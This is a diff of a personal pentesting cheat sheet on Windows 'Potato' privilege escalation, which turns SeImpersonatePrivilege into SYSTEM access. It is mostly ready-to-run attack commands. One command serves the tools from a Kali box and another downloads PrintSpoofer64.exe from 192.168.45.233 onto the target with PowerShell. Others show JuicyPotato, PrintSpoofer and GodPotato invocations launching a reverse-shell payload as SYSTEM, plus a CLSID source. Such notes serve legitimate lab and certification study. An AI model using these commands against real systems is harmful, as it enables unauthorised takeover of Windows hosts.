@@ -1,62 +1,80 @@
-## Potato Attacks — SeImpersonate → SYSTEM
+# Potato Attacks — SeImpersonate → SYSTEM
 
-→ A family of local-privesc tools that abuse **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`** (check with `whoami /priv`). They coerce a SYSTEM process to authenticate to a pipe/COM object you control, steal its token, and run a command **as SYSTEM**. 
-**How you use it:** each Potato is a precompiled **`.exe` you transfer to the target** (see [[File_Transfer]] — certutil / SMB / UNC), then run from your existing shell. It launches your payload (a cmd, or a msfvenom `revshell.exe`) as SYSTEM. **Start your listener first.**
+**Trigger to look for:** `whoami /priv` shows **`SeImpersonatePrivilege`** OR
+**`SeAssignPrimaryTokenPrivilege`** = *Enabled*. Common on IIS / MSSQL service
+accounts (`iis apppool\...`, `mssql...`). That one privilege → **SYSTEM**.
 
----
+**How it works (one line):** the Potato `.exe` tricks a SYSTEM process into
+authenticating to a pipe/COM object you control, steals its token, and runs your
+command **as SYSTEM**.
 
-## Which Potato for which OS (pick by `ver` / `systeminfo`)
-
-| Tool                           | Works on                                                                | Broken / not for                                | Trigger                                            |
-| ------------------------------ | ----------------------------------------------------------------------- | ----------------------------------------------- | -------------------------------------------------- |
-| **JuicyPotato**                | Win7/8/10 (pre-1809), **Server 2008 / 2008 R2 / 2012 / 2012 R2 / 2016** | Win10 1809+ / Server 2019+ (DCOM trick patched) | DCOM/BITS — needs a valid **CLSID** for the OS     |
-| **RottenPotato / PotatoNG**    | Server 2008 / 2012 era (old)                                            | superseded by JuicyPotato                       | DCOM/NTLM relay                                    |
-| **PrintSpoofer**               | **Win10/11, Server 2016 / 2019 / 2022**                                 | old 2008 (spooler differs)                      | Print Spooler named pipe (spooler must be running) |
-| **GodPotato**                  | **Server 2012 – 2022, Win8 – 11** (wide modern all-rounder)             | Server 2008 (needs newer .NET/DCOM)             | DCOM/RPC — needs .NET 3.5+                         |
-| **RoguePotato**                | Win10 1809+ / Server 2019+                                              | pre-1809                                        | OXID resolver — needs a network redirector         |
-| **EfsPotato / SharpEfsPotato** | Server 2016 / 2019 / 2022                                               | —                                               | MS-EFSR pipe                                       |
-| **SweetPotato**                | bundles several (auto-picks)                                            | —                                               | tries multiple triggers                            |
-
-**Quick rule:**
-- **Old box (2008 / 2012 / 2016)** → **JuicyPotato**
-- **Modern box (2019 / 2022 / Win10 1809+ / 11)** → **PrintSpoofer** first, then **GodPotato** / RoguePotato
+> ⚠️ **Start your listener first** if your `-c` runs a reverse shell.
 
 ---
 
-## JuicyPotato (old Windows — 2008 / 2012 / 2016)
+## 📁 Where the files live (Kali)
 
-```cmd
-JuicyPotato.exe -l 1337 -p C:\wamp\www\revshell.exe -t * -c {CLSID}
+**`/home/nepps1/tools/potatoes/`** — staged, ready to transfer:
+`JuicyPotato.exe` · `PrintSpoofer64.exe` / `PrintSpoofer32.exe` ·
+`GodPotato-NET4.exe` / `GodPotato-NET35.exe` · `RoguePotato.exe` (+`RogueOxidResolver.exe`)
+
+---
+
+## Which one? Read it straight off `systeminfo`
+
+Look at the **`OS Name`** and **`OS Version`** lines `systeminfo` prints, then match:
+
+| `systeminfo` shows                              | Build             | Use                                                   | Staged file                                 |
+| ----------------------------------------------- | ----------------- | ----------------------------------------------------- | ------------------------------------------- |
+| Server **2008 / 2012 / 2016**, Win10 **<1809**  | build **< 17763** | **JuicyPotato** (needs a CLSID)                       | `JuicyPotato.exe`                           |
+| Server **2019 / 2022**, Win10 **1809+** / Win11 | build **≥ 17763** | **PrintSpoofer** (try 1st) → **GodPotato** (fallback) | `PrintSpoofer64.exe` / `GodPotato-NET4.exe` |
+
+> **The build number is the tiebreaker.** `OS Version: 10.0.17763` → 17763 = the 1809 line = **modern** (PrintSpoofer/GodPotato). Anything below → JuicyPotato.
+> **Unsure?** `GodPotato-NET4.exe` is the safe all-rounder for **2012–2022**.
+> **32-bit target?** JuicyPotato is x64-only — use `PrintSpoofer32.exe` instead.
+
+---
+
+## Get it onto the target
+
+**Kali** (serve from the potatoes dir):
+```bash
+cd /home/nepps1/tools/potatoes && python3 -m http.server 80
 ```
-→ `-l` COM listen port (any free port) · `-p` program to run as SYSTEM · `-t *` try both CreateProcess methods · `-c` a **CLSID valid for this OS**.
-
-**CLSID list:** `http://ohpe.it/juicy-potato/CLSID/` — pick one matching the exact OS. Common 2008/generic BITS CLSID: `{4991d34b-80a1-4291-83b6-3328366b9097}`. If one returns a COM error, try another from the list.
-
-> Confirm with `whoami` → `nt authority\system`. Point `-p` at a msfvenom `revshell.exe` (or `-p C:\Windows\System32\cmd.exe -a "/c <cmd>"`).
+**Target** (pull, from your PS shell):
+```powershell
+iwr http://192.168.45.233/PrintSpoofer64.exe -o C:\Users\Public\p.exe
+```
 
 ---
 
-## PrintSpoofer (modern — 2016 / 2019 / Win10+)
+## Run it
 
-```cmd
-PrintSpoofer.exe -i -c cmd
-PrintSpoofer64.exe -c "C:\Users\Public\revshell.exe"
+**PrintSpoofer** (modern — 2016 / 2019 / 2022; needs Print Spooler running):
+```bash
+p.exe -i -c cmd                              # interactive SYSTEM shell, and this only works if you are in cmd not powershell.
+.\p.exe -c "C:\Users\Public\revshell.exe"      # or fire a reverse shell
 ```
-→ `-i` interact with the spawned process · `-c` command/exe to run as SYSTEM. Needs the **Print Spooler** service running.
 
-## GodPotato (modern all-rounder — 2012–2022)
-
+**GodPotato** (all-rounder 2012–2022; needs .NET — match -NET4 / -NET35):
 ```cmd
-GodPotato-NET4.exe -cmd "cmd /c whoami"
+GodPotato-NET4.exe -cmd "cmd /c whoami"                    # confirm = nt authority\system
 GodPotato-NET4.exe -cmd "C:\Users\Public\revshell.exe"
 ```
-→ Match the `-NET2` / `-NET4` build to the installed .NET version. Reliable when PrintSpoofer's spooler trick is blocked.
+
+**JuicyPotato** (old — 2008 / 2012 / 2016; needs a CLSID for the exact OS):
+```cmd
+JuicyPotato.exe -l 1337 -p C:\Users\Public\revshell.exe -t * -c {CLSID}
+```
+→ CLSID list: `http://ohpe.it/juicy-potato/CLSID/` (pick one matching the OS).
+Generic BITS CLSID: `{4991d34b-80a1-4291-83b6-3328366b9097}`. Error → try another.
+
+> **Confirm every time:** `whoami` → `nt authority\system`.
 
 ---
 
 ## Related Notes
-
 - [[Windows_Priv_Esc]] — full privesc order of operations (SeImpersonate section)
-- [[File_Transfer]] — getting the .exe onto the target
-- [[Msfvenom]] — build the SYSTEM payload the Potato runs
+- [[File_Transfer]] — other transfer methods (certutil / SMB / UNC)
+- [[Msfvenom]] — build the `revshell.exe` payload the Potato runs
 - [[ReverseShells]]
